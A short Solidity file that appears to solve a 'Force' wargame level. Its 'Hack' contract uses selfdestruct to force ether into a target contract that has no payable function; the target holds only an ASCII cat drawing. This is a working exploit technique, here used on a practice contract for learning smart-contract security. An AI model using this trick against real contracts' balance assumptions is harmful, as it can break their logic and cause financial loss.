// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


contract Hack
{
    function suicide(address i) public
    {
        selfdestruct(payable(i));
    }
    
    receive() external payable
    {

    }
}


contract Force 
{/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}

